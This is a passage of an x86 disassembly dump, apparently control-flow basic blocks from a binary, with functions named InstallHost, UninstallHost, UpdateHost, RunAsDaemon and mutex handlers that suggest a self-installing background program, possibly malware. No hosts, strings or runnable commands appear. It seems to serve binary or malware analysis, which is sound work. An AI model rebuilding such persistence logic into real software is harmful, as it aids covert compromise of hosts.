0x8052614:	push	dword ptr [esp + 0x5c]
0x8052618:	push	dword ptr [esp + 0x5c]
0x805261c:	lea	eax, dword ptr [esp + 0x196c]
0x8052623:	push	eax
0x8052624:	push	edx
0x8052625:	lea	eax, dword ptr [esp + 0x1174]
0x805262c:	push	eax
0x805262d:	push	0x80564ef
0x8052632:	push	1
0x8052634:	lea	ebx, dword ptr [esp + 0x2198]
0x805263b:	push	ebx
0x805263c:	call	0x804bd20
None
|
|
|
v
0x8052517:	pop	ebx
0x8052518:	pop	esi
0x8052519:	push	0x1100
0x805251e:	lea	ebx, dword ptr [esp + 0x30]
0x8052522:	push	ebx
0x8052523:	call	0x804f49b
None
|
|
|
v
0x805258a:	mov	edx, dword ptr [esp + 0x2148]
0x8052591:	mov	dword ptr [esp + 0x1c], edx
0x8052595:	mov	edx, dword ptr [esp + 0x2140]
0x805259c:	mov	ecx, eax
0x805259e:	mov	eax, dword ptr [esp + 0x2144]
0x80525a5:	mov	dword ptr [esp + 0x10], ecx
0x80525a9:	mov	dword ptr [esp + 0x24], edx
0x80525ad:	mov	edx, dword ptr [esp + 0x2138]
0x80525b4:	mov	dword ptr [esp + 0x18], eax
0x80525b8:	mov	eax, dword ptr [esp + 0x213c]
0x80525bf:	mov	dword ptr [esp + 0x2c], edx
0x80525c3:	mov	dword ptr [esp + 0x20], eax
0x80525c7:	mov	eax, dword ptr [esp + 0x2134]
0x80525ce:	mov	dword ptr [esp + 0x28], eax
0x80525d2:	call	0x805234d
None
|
|
|
v
0x805255e:	mov	byte ptr [esp + 0x17], al
0x8052562:	call	0x804fdc2
None
|
|
|
v
0x805267b:	add	esp, 0x215c
0x8052681:	pop	ebx
0x8052682:	pop	esi
0x8052683:	pop	edi
0x8052684:	pop	ebp
0x8052685:	ret	
None
|
|
|
v
0x8052567:	mov	esi, eax
0x8052569:	call	0x80530cc
None
|
|
|
v
0x805265d:	push	eax
0x805265e:	push	dword ptr [esp + 0x2140]
0x8052665:	push	0x20
0x8052667:	push	dword ptr [esp + 0x216c]
0x805266e:	call	0x804e62a
None
|
|
|
v
0x8052641:	add	esp, 0x60
0x8052644:	cmp	eax, 0xff
0x8052647:	jne	0x805265d
None
|
|
|
v
0x805257c:	mov	dword ptr [esp], 0x80564ea
0x8052583:	mov	ebp, eax
0x8052585:	call	0x804bd10
None
|
|
|
v
0x8052528:	add	esp, 0x10
0x805252b:	test	al, al
0x805252d:	jne	0x8052543
None
|
|
|
v
0x805256e:	mov	dword ptr [esp], 0x80561e9
0x8052575:	mov	edi, eax
0x8052577:	call	0x804bd10
None
|
|
|
v
0x8052649:	push	0
0x805264b:	push	0
0x805264d:	push	0x21
0x805264f:	push	dword ptr [esp + 0x216c]
0x8052656:	call	0x804e62a
None
|
|
|
v
0x8052540:	add	esp, 0x10
0x8052543:	mov	dword ptr [esp + 0x213c], 0
0x805254e:	sub	esp, 0xc
0x8052551:	mov	ebx, dword ptr [0x8058730]
0x8052557:	push	0x40
0x8052559:	call	0x8052879
None
|
|
|
v
0x805265b:	jmp	0x805267b
None
|
|
|
v
0x8052543:	mov	dword ptr [esp + 0x213c], 0
0x805254e:	sub	esp, 0xc
0x8052551:	mov	ebx, dword ptr [0x8058730]
0x8052557:	push	0x40
0x8052559:	call	0x8052879
None
|
|
|
v
0x80524d9:	push	ebp
0x80524da:	push	edi
0x80524db:	push	esi
0x80524dc:	push	ebx
0x80524dd:	sub	esp, 0x2154
0x80524e3:	push	0x800
0x80524e8:	lea	eax, dword ptr [esp + 0x1130]
0x80524ef:	push	eax
0x80524f0:	call	0x80523c2
None
|
|
|
v
0x805252f:	push	eax
0x8052530:	push	0x1100
0x8052535:	push	0x80564c3
0x805253a:	push	ebx
0x805253b:	call	0x8051ce0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:UpdateHost
TOTAL BLOCKS :7
0x8052688:	push	ebx
0x8052689:	sub	esp, 0x14
0x805268c:	mov	ebx, dword ptr [esp + 0x1c]
0x8052690:	push	ebx
0x8052691:	call	0x804f727
None
|
|
|
v
0x80526a2:	add	ebx, 0x2200
0x80526a8:	push	ecx
0x80526a9:	push	ecx
0x80526aa:	push	0x1ff
0x80526af:	push	ebx
0x80526b0:	call	0x804bf30
None
|
|
|
v
0x80526c5:	add	esp, 8
0x80526c8:	pop	ebx
0x80526c9:	ret	
None
|
|
|
v
0x80526c2:	add	esp, 0x10
0x80526c5:	add	esp, 8
0x80526c8:	pop	ebx
0x80526c9:	ret	
None
|
|
|
v
0x80526b5:	add	esp, 0xc
0x80526b8:	push	0
0x80526ba:	push	0
0x80526bc:	push	ebx
0x80526bd:	call	0x804be60
None
|
|
|
v
0x8052696:	add	esp, 0x10
0x8052699:	test	al, al
0x805269b:	je	0x80526c5
None
|
|
|
v
0x805269d:	call	0x805297b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:TranslateMacros
TOTAL BLOCKS :37
0x80527b9:	add	esp, 0x10
0x80527bc:	mov	ebx, dword ptr [esp + 0x3c]
0x80527c0:	test	eax, eax
0x80527c2:	mov	esi, eax
0x80527c4:	je	0x805286f
None
|
|
|
v
0x80526fd:	mov	edi, esi
0x80526ff:	xor	eax, eax
0x8052701:	mov	ecx, ebp
0x8052703:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80527f1:	mov	dword ptr [esp + 0x14], eax
0x80527f5:	add	esp, 0x10
0x80527f8:	test	eax, eax
0x80527fa:	je	0x805286f
None
|
|
|
v
0x805285d:	pop	ecx
0x805285e:	lea	eax, dword ptr [esp + 0x48]
0x8052862:	push	eax
0x8052863:	call	0x804f57c
None
|
|
|
v
0x80526ec:	mov	dword ptr [esp + 0x4c], eax
0x80526f0:	add	esp, 0x10
0x80526f3:	test	eax, eax
0x80526f5:	mov	edx, eax
0x80526f7:	je	0x805286f
None
|
|
|
v
0x80526e2:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x805272c:	lea	edx, dword ptr [eax + 1]
0x805272f:	mov	dword ptr [esp + 0xc], edx
0x8052733:	push	esi
0x8052734:	push	dword ptr [esp + 0x40]
0x8052738:	push	0x8056529
0x805273d:	push	edx
0x805273e:	call	0x8051d7f
None
|
|
|
v
0x8052824:	mov	ebx, dword ptr [esp + 0x4c]
0x8052828:	xor	eax, eax
0x805282a:	or	ecx, 0xffffffff
0x805282d:	add	esp, 0xc
0x8052830:	mov	edi, ebx
0x8052832:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052834:	mov	edi, esi
0x8052836:	mov	edx, ecx
0x8052838:	or	ecx, 0xffffffff
0x805283b:	not	edx
0x805283d:	sub	edx, dword ptr [esp + 0xc]
0x8052841:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80527b0:	sub	esp, 0xc
0x80527b3:	push	edx
0x80527b4:	call	0x804bd10
None
|
|
|
v
0x80527d4:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x805286f:	add	esp, 0x4c
0x8052872:	mov	eax, ebx
0x8052874:	pop	ebx
0x8052875:	pop	esi
0x8052876:	pop	edi
0x8052877:	pop	ebp
0x8052878:	ret	
None
|
|
|
v
0x8052763:	mov	ebx, dword ptr [esp + 0x3c]
0x8052767:	jmp	0x805286f
None
|
|
|
v
0x80527fc:	push	edx
0x80527fd:	mov	edi, esi
0x80527ff:	push	dword ptr [esp + 0x10]
0x8052803:	push	ebx
0x8052804:	push	eax
0x8052805:	call	0x8051ce0
None
|
|
|
v
0x805274e:	mov	esi, dword ptr [esp + 8]
0x8052752:	sub	esi, ebp
0x8052754:	lea	eax, dword ptr [esi - 2]
0x8052757:	lea	edx, dword ptr [esi - 1]
0x805275a:	cmp	eax, 0x1e
0x805275d:	mov	dword ptr [esp + 4], edx
0x8052761:	jbe	0x805276c
None
|
|
|
v
0x805280a:	xor	eax, eax
0x805280c:	or	ecx, 0xffffffff
0x805280f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052868:	add	esp, 0x10
0x805286b:	mov	ebx, dword ptr [esp + 4]
0x805286f:	add	esp, 0x4c
0x8052872:	mov	eax, ebx
0x8052874:	pop	ebx
0x8052875:	pop	esi
0x8052876:	pop	edi
0x8052877:	pop	ebp
0x8052878:	ret	
None
|
|
|
v
0x8052703:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052811:	add	esp, 0xc
0x8052814:	not	ecx
0x8052816:	push	ecx
0x8052817:	push	esi
0x8052818:	mov	eax, dword ptr [esp + 0x10]
0x805281c:	add	eax, ebp
0x805281e:	push	eax
0x805281f:	call	0x8051ce0
None
|
|
|
v
0x8052705:	not	ecx
0x8052707:	push	edi
0x8052708:	push	ecx
0x8052709:	push	esi
0x805270a:	push	edx
0x805270b:	call	0x8051ce0
None
|
|
|
v
0x805276c:	push	ebx
0x805276d:	mov	ebx, 1
0x8052772:	push	esi
0x8052773:	mov	eax, dword ptr [esp + 0x14]
0x8052777:	add	eax, dword ptr [esp + 0x44]
0x805277b:	push	eax
0x805277c:	lea	eax, dword ptr [esp + 0x28]
0x8052780:	push	eax
0x8052781:	call	0x8051ce0
None
|
|
|
v
0x8052743:	mov	dword ptr [esp + 0x18], eax
0x8052747:	add	esp, 0x10
0x805274a:	cmp	eax, ebp
0x805274c:	jle	0x8052763
None
|
|
|
v
0x8052786:	add	esp, 0x10
0x8052789:	sub	esp, 0xc
0x805278c:	lea	edi, dword ptr [esp + 0x27]
0x8052790:	add	edi, ebx
0x8052792:	inc	ebx
0x8052793:	movsx	eax, byte ptr [edi]
0x8052796:	lea	edx, dword ptr [esp + 0x28]
0x805279a:	push	eax
0x805279b:	mov	dword ptr [esp + 0x10], edx
0x805279f:	call	0x8052098
None
|
|
|
v
0x80527d6:	mov	edi, esi
0x80527d8:	mov	edx, ecx
0x80527da:	or	ecx, 0xffffffff
0x80527dd:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052710:	add	esp, 0xc
0x8052713:	push	dword ptr [esp + 0x40]
0x8052717:	push	0x8056529
0x805271c:	push	0
0x805271e:	call	0x8051d7f
None
|
|
|
v
0x8052841:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052789:	sub	esp, 0xc
0x805278c:	lea	edi, dword ptr [esp + 0x27]
0x8052790:	add	edi, ebx
0x8052792:	inc	ebx
0x8052793:	movsx	eax, byte ptr [edi]
0x8052796:	lea	edx, dword ptr [esp + 0x28]
0x805279a:	push	eax
0x805279b:	mov	dword ptr [esp + 0x10], edx
0x805279f:	call	0x8052098
None
|
|
|
v
0x805280f:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80527df:	not	edx
0x80527e1:	not	ecx
0x80527e3:	lea	eax, dword ptr [edx + ecx - 2]
0x80527e7:	sub	eax, dword ptr [esp + 0x10]
0x80527eb:	push	eax
0x80527ec:	call	0x804bd40
None
|
|
|
v
0x80526e4:	not	ecx
0x80526e6:	push	ecx
0x80526e7:	call	0x804bd40
None
|
|
|
v
0x8052832:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80527ca:	xor	eax, eax
0x80527cc:	or	ecx, 0xffffffff
0x80527cf:	mov	edi, ebx
0x80527d1:	sub	esp, 0xc
0x80527d4:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80526cc:	push	ebp
0x80526cd:	or	ebp, 0xffffffff
0x80526d0:	push	edi
0x80526d1:	xor	eax, eax
0x80526d3:	push	esi
0x80526d4:	mov	ecx, ebp
0x80526d6:	push	ebx
0x80526d7:	xor	ebx, ebx
0x80526d9:	sub	esp, 0x58
0x80526dc:	mov	esi, dword ptr [esp + 0x6c]
0x80526e0:	mov	edi, esi
0x80526e2:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80527a4:	add	esp, 0x10
0x80527a7:	cmp	ebx, esi
0x80527a9:	mov	byte ptr [edi], al
0x80527ab:	mov	edx, dword ptr [esp]
0x80527ae:	jne	0x8052789
None
|
|
|
v
0x8052723:	add	esp, 0x10
0x8052726:	test	eax, eax
0x8052728:	mov	ebp, eax
0x805272a:	js	0x8052763
None
|
|
|
v
0x80527dd:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052843:	push	edx
0x8052844:	mov	edx, dword ptr [esp + 0x10]
0x8052848:	not	ecx
0x805284a:	lea	eax, dword ptr [ebx + edx + 1]
0x805284e:	push	eax
0x805284f:	lea	eax, dword ptr [ebp + ecx - 1]
0x8052853:	add	eax, dword ptr [esp + 0x10]
0x8052857:	push	eax
0x8052858:	call	0x8051ce0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:IsOptionEnabled
TOTAL BLOCKS :2
0x8052879:	push	ebx
0x805287a:	sub	esp, 0x14
0x805287d:	mov	ebx, dword ptr [esp + 0x1c]
0x8052881:	push	0x8058370
0x8052886:	call	0x8051de0
None
|
|
|
v
0x805288b:	and	eax, ebx
0x805288d:	cmp	eax, ebx
0x805288f:	sete	al
0x8052892:	add	esp, 0x18
0x8052895:	pop	ebx
0x8052896:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RunAsDaemon
TOTAL BLOCKS :13
0x80528f7:	add	esp, 0xc
0x80528fa:	ret	
None
|
|
|
v
0x80528cb:	add	esp, 0x10
0x80528ce:	test	eax, eax
0x80528d0:	jne	0x80528f7
None
|
|
|
v
0x80528a6:	sub	esp, 0xc
0x80528a9:	push	0
0x80528ab:	call	0x804bd80
None
|
|
|
v
0x80528b0:	sub	esp, 0xc
0x80528b3:	push	0
0x80528b5:	call	0x804bf50
None
|
|
|
v
0x80528e8:	mov	dword ptr [esp], 2
0x80528ef:	call	0x804bfb0
None
|
|
|
v
0x805289f:	cmp	eax, 0
0x80528a2:	jl	0x80528f7
None
|
|
|
v
0x8052897:	sub	esp, 0xc
0x805289a:	call	0x804bea0
None
|
|
|
v
0x80528f4:	add	esp, 0x10
0x80528f7:	add	esp, 0xc
0x80528fa:	ret	
None
|
|
|
v
0x80528bf:	mov	dword ptr [esp], 0x8056132
0x80528c6:	call	0x804bc10
None
|
|
|
v
0x80528ba:	call	0x804bda0
None
|
|
|
v
0x80528a4:	je	0x80528b0
None
|
|
|
v
0x80528dc:	mov	dword ptr [esp], 1
0x80528e3:	call	0x804bfb0
None
|
|
|
v
0x80528d2:	sub	esp, 0xc
0x80528d5:	push	0
0x80528d7:	call	0x804bfb0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:UninstallHost
TOTAL BLOCKS :12
0x8052973:	add	esp, 0x1108
0x8052979:	pop	ebx
0x805297a:	ret	
None
|
|
|
v
0x8052970:	add	esp, 0x10
0x8052973:	add	esp, 0x1108
0x8052979:	pop	ebx
0x805297a:	ret	
None
|
|
|
v
0x80528fb:	push	ebx
0x80528fc:	sub	esp, 0x1114
0x8052902:	push	8
0x8052904:	call	0x8052879
None
|
|
|
v
0x805294d:	sub	esp, 0xc
0x8052950:	push	4
0x8052952:	call	0x8052879
None
|
|
|
v
0x805295e:	mov	eax, dword ptr [0x805ba14]
0x8052963:	test	eax, eax
0x8052965:	je	0x8052973
None
|
|
|
v
0x805294a:	add	esp, 0x10
0x805294d:	sub	esp, 0xc
0x8052950:	push	4
0x8052952:	call	0x8052879
None
|
|
|
v
0x8052941:	add	esp, 0x14
0x8052944:	push	ebx
0x8052945:	call	0x804f0fc
None
|
|
|
v
0x805291d:	add	esp, 0xc
0x8052920:	push	0x8058420
0x8052925:	push	eax
0x8052926:	push	0x805652b
0x805292b:	push	0x1100
0x8052930:	push	1
0x8052932:	push	0x1100
0x8052937:	lea	ebx, dword ptr [esp + 0x1c]
0x805293b:	push	ebx
0x805293c:	call	0x804bb70
None
|
|
|
v
0x8052967:	sub	esp, 0xc
0x805296a:	push	eax
0x805296b:	call	0x804bbe0
None
|
|
|
v
0x8052910:	sub	esp, 0xc
0x8052913:	push	0x80561e9
0x8052918:	call	0x804bd10
None
|
|
|
v
0x8052957:	add	esp, 0x10
0x805295a:	test	al, al
0x805295c:	je	0x8052973
None
|
|
|
v
0x8052909:	add	esp, 0x10
0x805290c:	test	al, al
0x805290e:	je	0x805294d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CloseMutexHandle
TOTAL BLOCKS :6
0x805297b:	push	ebx
0x805297c:	sub	esp, 0x18
0x805297f:	mov	eax, dword ptr [0x8058710]
0x8052984:	cmp	eax, 0xff
0x8052987:	je	0x80529ba
None
|
|
|
v
0x80529b7:	add	esp, 0x10
0x80529ba:	add	esp, 0x18
0x80529bd:	pop	ebx
0x80529be:	ret	
None
|
|
|
v
0x8052989:	sub	esp, 0xc
0x805298c:	push	eax
0x805298d:	call	0x804bfb0
None
|
|
|
v
0x80529ba:	add	esp, 0x18
0x80529bd:	pop	ebx
0x80529be:	ret	
None
|
|
|
v
0x8052992:	pop	eax
0x8052993:	pop	edx
0x8052994:	push	0x80584b8
0x8052999:	push	0x805654b
0x805299e:	push	0x10
0x80529a0:	push	1
0x80529a2:	push	0x10
0x80529a4:	lea	ebx, dword ptr [esp + 0x1c]
0x80529a8:	push	ebx
0x80529a9:	call	0x804bb70
None
|
|
|
v
0x80529ae:	add	esp, 0x14
0x80529b1:	push	ebx
0x80529b2:	call	0x804f0fc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:OpenMutexHandle
TOTAL BLOCKS :8
0x8052a38:	add	esp, 0x10
0x8052a3b:	mov	dl, 1
0x8052a3d:	inc	eax
0x8052a3e:	jne	0x8052a51
None
|
|
|
v
0x8052a40:	mov	dword ptr [0x8058710], 0xffffffff
0x8052a4a:	call	0x805297b
None
|
|
|
v
0x8052a51:	add	esp, 0x38
0x8052a54:	mov	al, dl
0x8052a56:	pop	ebx
0x8052a57:	ret	
None
|
|
|
v
0x80529dd:	mov	word ptr [esp + 0x28], 1
0x80529e4:	mov	word ptr [esp + 0x2a], 0
0x80529eb:	mov	dword ptr [esp + 0x2c], 0
0x80529f3:	mov	dword ptr [esp + 0x30], 0
0x80529fb:	mov	dword ptr [esp + 0x34], 1
0x8052a03:	mov	dword ptr [esp + 0x38], 0
0x8052a0b:	add	esp, 0x1c
0x8052a0e:	push	0x1b6
0x8052a13:	push	0x41
0x8052a15:	push	ebx
0x8052a16:	call	0x804bde0
None
|
|
|
v
0x8052a1b:	add	esp, 0x10
0x8052a1e:	xor	edx, edx
0x8052a20:	cmp	eax, 0xff
0x8052a23:	mov	dword ptr [0x8058710], eax
0x8052a28:	je	0x8052a51
None
|
|
|
v
0x8052a2a:	push	ecx
0x8052a2b:	lea	edx, dword ptr [esp + 0xc]
0x8052a2f:	push	edx
0x8052a30:	push	0xd
0x8052a32:	push	eax
0x8052a33:	call	0x804bdf0
None
|
|
|
v
0x8052a4f:	xor	edx, edx
0x8052a51:	add	esp, 0x38
0x8052a54:	mov	al, dl
0x8052a56:	pop	ebx
0x8052a57:	ret	
None
|
|
|
v
0x80529bf:	push	ebx
0x80529c0:	sub	esp, 0x40
0x80529c3:	push	0x80584b8
0x80529c8:	push	0x805654b
0x80529cd:	push	0x10
0x80529cf:	push	1
0x80529d1:	push	0x10
0x80529d3:	lea	ebx, dword ptr [esp + 0x3c]
0x80529d7:	push	ebx
0x80529d8:	call	0x804bb70
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InstallHost
TOTAL BLOCKS :75
0x8052b6f:	add	esp, 0xc
0x8052b72:	push	0
0x8052b74:	push	edi
0x8052b75:	push	ebx
0x8052b76:	call	0x804f0a6
None
|
|
|
v
0x8052b7b:	pop	ebx
0x8052b7c:	push	0
0x8052b7e:	call	0x804bd80
None
|
|
|
v
0x8052c3c:	mov	dword ptr [esp], edi
0x8052c3f:	call	0x804bbe0
None
|
|
|
v
0x8052d3b:	add	esp, 0x10
0x8052d3e:	mov	dword ptr [0x805ba14], eax
0x8052d43:	sub	esp, 0xc
0x8052d46:	push	0x40
0x8052d48:	call	0x8052879
None
|
|
|
v
0x8052ccb:	push	eax
0x8052ccc:	push	eax
0x8052ccd:	push	esi
0x8052cce:	push	ebx
0x8052ccf:	call	0x80520a8
None
|
|
|
v
0x8052abf:	mov	dword ptr [esp + 0x5518], eax
0x8052ac6:	add	esp, 0x10
0x8052ac9:	test	eax, eax
0x8052acb:	mov	edx, eax
0x8052acd:	je	0x8052afa
None
|
|
|
v
0x8052bf6:	add	esp, 0x18
0x8052bf9:	push	0x80568bf
0x8052bfe:	push	ebx
0x8052bff:	call	0x804bca0
None
|
|
|
v
0x8052d14:	call	0x8052897
None
|
|
|
v
0x8052b62:	push	ecx
0x8052b63:	push	ecx
0x8052b64:	push	0x1ff
0x8052b69:	push	ebx
0x8052b6a:	call	0x804bf30
None
|
|
|
v
0x8052ab3:	mov	dword ptr [esp], 0x8058434
0x8052aba:	call	0x80526cc
None
|
|
|
v
0x8052b43:	add	esp, 0x10
0x8052b46:	test	al, al
0x8052b48:	jne	0x8052b83
None
|
|
|
v
0x8052da3:	add	esp, 0x10
0x8052da6:	jmp	0x8052de2
None
|
|
|
v
0x8052b1c:	mov	dword ptr [esp], 1
0x8052b23:	call	0x8052879
None
|
|
|
v
0x8052ca1:	push	eax
0x8052ca2:	push	eax
0x8052ca3:	lea	eax, dword ptr [esp + 0xf]
0x8052ca7:	push	eax
0x8052ca8:	push	0x80565cd
0x8052cad:	push	0x1100
0x8052cb2:	push	1
0x8052cb4:	push	0x1100
0x8052cb9:	push	ebx
0x8052cba:	call	0x804bb70
None
|
|
|
v
0x8052afa:	mov	edi, 0x8058434
0x8052aff:	xor	eax, eax
0x8052b01:	or	ecx, 0xffffffff
0x8052b04:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052c69:	pop	edx
0x8052c6a:	pop	ecx
0x8052c6b:	push	eax
0x8052c6c:	push	0x80565b9
0x8052c71:	push	0x1100
0x8052c76:	push	1
0x8052c78:	push	0x1100
0x8052c7d:	lea	ebx, dword ptr [esp + 0x4424]
0x8052c84:	push	ebx
0x8052c85:	call	0x804bb70
None
|
|
|
v
0x8052c98:	add	esp, 0x10
0x8052c9b:	test	eax, eax
0x8052c9d:	mov	edi, eax
0x8052c9f:	je	0x8052d00
None
|
|
|
v
0x8052a66:	test	al, al
0x8052a68:	jne	0x8052a83
None
|
|
|
v
0x8052c2f:	add	esp, 0x20
0x8052c32:	push	edi
0x8052c33:	push	eax
0x8052c34:	push	1
0x8052c36:	push	ebx
0x8052c37:	call	0x804bcb0
None
|
|
|
v
0x8052c04:	add	esp, 0x10
0x8052c07:	test	eax, eax
0x8052c09:	mov	edi, eax
0x8052c0b:	je	0x8052c47
None
|
|
|
v
0x8052d2a:	push	eax
0x8052d2b:	push	eax
0x8052d2c:	push	0x80565c8
0x8052d31:	lea	eax, dword ptr [esp + 0x13]
0x8052d35:	push	eax
0x8052d36:	call	0x804bca0
None
|
|
|
v
0x8052dda:	add	esp, 0x10
0x8052ddd:	jmp	0x8052cf4
None
|
|
|
v
0x8052b2f:	push	esi
0x8052b30:	push	esi
0x8052b31:	lea	edi, dword ptr [esp + 0xf]
0x8052b35:	push	edi
0x8052b36:	lea	ebx, dword ptr [esp + 0x1113]
0x8052b3d:	push	ebx
0x8052b3e:	call	0x80520a8
None
|
|
|
v
0x8052a97:	add	esp, 0x10
0x8052a9a:	test	al, al
0x8052a9c:	je	0x8052de2
None
|
|
|
v
0x8052b83:	sub	esp, 0xc
0x8052b86:	push	8
0x8052b88:	call	0x8052879
None
|
|
|
v
0x8052d73:	push	edi
0x8052d74:	push	0x81
0x8052d79:	push	eax
0x8052d7a:	push	0x8058374
0x8052d7f:	call	0x8051ce0
None
|
|
|
v
0x8052a83:	push	eax
0x8052a84:	push	eax
0x8052a85:	push	0x1100
0x8052a8a:	lea	ebx, dword ptr [esp + 0x2214]
0x8052a91:	push	ebx
0x8052a92:	call	0x804f49b
None
|
|
|
v
0x8052de2:	add	esp, 0x5510
0x8052de8:	pop	ebx
0x8052de9:	pop	esi
0x8052dea:	pop	edi
0x8052deb:	ret	
None
|
|
|
v
0x8052d95:	push	esi
0x8052d96:	push	esi
0x8052d97:	push	0
0x8052d99:	push	0x80554ed
0x8052d9e:	call	0x804f559
None
|
|
|
v
0x8052b5b:	add	esp, 0x10
0x8052b5e:	test	al, al
0x8052b60:	je	0x8052b83
None
|
|
|
v
0x8052d0d:	add	esp, 0x10
0x8052d10:	test	al, al
0x8052d12:	je	0x8052d19
None
|
|
|
v
0x8052af8:	jmp	0x8052b1c
None
|
|
|
v
0x8052ce8:	add	esp, 0x10
0x8052ceb:	test	eax, eax
0x8052ced:	jne	0x8052ccb
None
|
|
|
v
0x8052b06:	not	ecx
0x8052b08:	push	edi
0x8052b09:	push	ecx
0x8052b0a:	push	0x8058434
0x8052b0f:	lea	eax, dword ptr [esp + 0x1113]
0x8052b16:	push	eax
0x8052b17:	call	0x8051ce0
None
|
|
|
v
0x8052d23:	add	esp, 0x10
0x8052d26:	test	al, al
0x8052d28:	je	0x8052d43
None
|
|
|
v
0x8052b7c:	push	0
0x8052b7e:	call	0x804bd80
None
|
|
|
v
0x8052cfd:	add	esp, 0x10
0x8052d00:	sub	esp, 0xc
0x8052d03:	push	0x80
0x8052d08:	call	0x8052879
None
|
|
|
v
0x8052b8d:	add	esp, 0x10
0x8052b90:	test	al, al
0x8052b92:	je	0x8052c47
None
|
|
|
v
0x8052bc6:	add	esp, 0x14
0x8052bc9:	push	ebx
0x8052bca:	call	0x804f385
None
|
|
|
v
0x8052c47:	sub	esp, 0xc
0x8052c4a:	push	0x10
0x8052c4c:	call	0x8052879
None
|
|
|
v
0x8052b4a:	mov	byte ptr [esp + 0x2207], 0
0x8052b52:	sub	esp, 0xc
0x8052b55:	push	edi
0x8052b56:	call	0x804f172
None
|
|
|
v
0x8052a6a:	sub	esp, 0xc
0x8052a6d:	push	0x20
0x8052a6f:	call	0x8052879
None
|
|
|
v
0x8052acf:	xor	eax, eax
0x8052ad1:	mov	edi, edx
0x8052ad3:	or	ecx, 0xffffffff
0x8052ad6:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052d84:	pop	eax
0x8052d85:	lea	eax, dword ptr [esp + 0x5518]
0x8052d8c:	push	eax
0x8052d8d:	call	0x804f57c
None
|
|
|
v
0x8052da8:	push	ebx
0x8052da9:	push	ebx
0x8052daa:	lea	eax, dword ptr [esp + 0xf]
0x8052dae:	push	eax
0x8052daf:	push	0x80565cc
0x8052db4:	push	0x1100
0x8052db9:	push	1
0x8052dbb:	push	0x1100
0x8052dc0:	lea	ebx, dword ptr [esp + 0x4424]
0x8052dc7:	push	ebx
0x8052dc8:	call	0x804bb70
None
|
|
|
v
0x8052cbf:	add	esp, 0x20
0x8052cc2:	lea	esi, dword ptr [esp + 0x3308]
0x8052cc9:	jmp	0x8052cdb
None
|
|
|
v
0x8052cd4:	add	esp, 0x10
0x8052cd7:	test	al, al
0x8052cd9:	jne	0x8052cf4
None
|
|
|
v
0x8052aea:	pop	eax
0x8052aeb:	lea	eax, dword ptr [esp + 0x5514]
0x8052af2:	push	eax
0x8052af3:	call	0x804f57c
None
|
|
|
v
0x8052d58:	sub	esp, 0xc
0x8052d5b:	push	0x8058374
0x8052d60:	call	0x80526cc
None
|
|
|
v
0x8052d92:	add	esp, 0x10
0x8052d95:	push	esi
0x8052d96:	push	esi
0x8052d97:	push	0
0x8052d99:	push	0x80554ed
0x8052d9e:	call	0x804f559
None
|
|
|
v
0x8052cf4:	sub	esp, 0xc
0x8052cf7:	push	edi
0x8052cf8:	call	0x804bbe0
None
|
|
|
v
0x8052a7b:	sub	esp, 0xc
0x8052a7e:	jmp	0x8052b7c
None
|
|
|
v
0x8052b04:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052cdb:	push	eax
0x8052cdc:	push	edi
0x8052cdd:	push	0x1100
0x8052ce2:	push	esi
0x8052ce3:	call	0x804bbd0
None
|
|
|
v
0x8052d19:	sub	esp, 0xc
0x8052d1c:	push	4
0x8052d1e:	call	0x8052879
None
|
|
|
v
0x8052d65:	mov	dword ptr [esp + 0x551c], eax
0x8052d6c:	add	esp, 0x10
0x8052d6f:	test	eax, eax
0x8052d71:	je	0x8052d95
None
|
|
|
v
0x8052ba5:	pop	edi
0x8052ba6:	pop	edx
0x8052ba7:	push	eax
0x8052ba8:	push	0x8056554
0x8052bad:	push	0x1100
0x8052bb2:	push	1
0x8052bb4:	push	0x1100
0x8052bb9:	lea	ebx, dword ptr [esp + 0x3324]
0x8052bc0:	push	ebx
0x8052bc1:	call	0x804bb70
None
|
|
|
v
0x8052ad6:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8052c0d:	push	esi
0x8052c0e:	push	0x8058420
0x8052c13:	lea	eax, dword ptr [esp + 0xf]
0x8052c17:	push	eax
0x8052c18:	push	0x8056577
0x8052c1d:	push	0x1100
0x8052c22:	push	1
0x8052c24:	push	0x1100
0x8052c29:	push	ebx
0x8052c2a:	call	0x804bb70
None
|
|
|
v
0x8052ad8:	push	eax
0x8052ad9:	not	ecx
0x8052adb:	push	ecx
0x8052adc:	push	edx
0x8052add:	lea	eax, dword ptr [esp + 0x1113]
0x8052ae4:	push	eax
0x8052ae5:	call	0x8051ce0
None
|
|
|
v
0x8052dcd:	add	esp, 0x20
0x8052dd0:	push	edi
0x8052dd1:	push	eax
0x8052dd2:	push	1
0x8052dd4:	push	ebx
0x8052dd5:	call	0x804bcb0
None
|
|
|
v
0x8052d43:	sub	esp, 0xc
0x8052d46:	push	0x40
0x8052d48:	call	0x8052879
None
|
